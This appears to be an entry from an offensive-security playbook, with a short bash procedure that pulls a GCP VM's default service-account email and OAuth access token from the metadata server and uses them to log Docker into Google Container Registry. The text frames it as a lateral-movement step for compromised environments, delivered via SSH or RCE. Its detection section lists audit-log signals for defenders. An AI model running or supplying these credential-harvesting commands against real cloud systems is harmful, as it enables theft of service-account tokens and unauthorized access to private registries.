---
type: code
language: bash
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - gcp
  - oauth
  - script
validated: true
---

# gcp-oauth-docker-login-script

## Code

```bash
curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email
curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token 
docker login -e <email> -u oauth2accesstoken -p "<access token>" https://gcr.io
```

## Description

This script extracts the GCP default service account email and OAuth token from instance metadata, then uses them to authenticate Docker to Google Container Registry. Useful for lateral movement in compromised GCP environments with access to metadata service.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <email> | Service account email from first curl | 123456-compute@developer.gserviceaccount.com |
| <access token> | OAuth token from second curl's JSON | ya29.a0AfH6SMD... |

## Usage

Run on a GCP VM with default service account. Substitute <email> and <access token> manually or automate parsing (e.g., with jq for token). Allows pulling private images from gcr.io post-login. Deliver via initial access like SSH or RCE.

## Detection

- GCP metadata API calls from unexpected instances (audit Cloud Audit Logs for computeMetadata requests).
- Docker login attempts to gcr.io with oauth2accesstoken (monitor Docker daemon logs).
- Anomalous token usage in Container Registry access logs.

## Related

- [[procedures/Insecure-Docker-Registry-Pentest]]
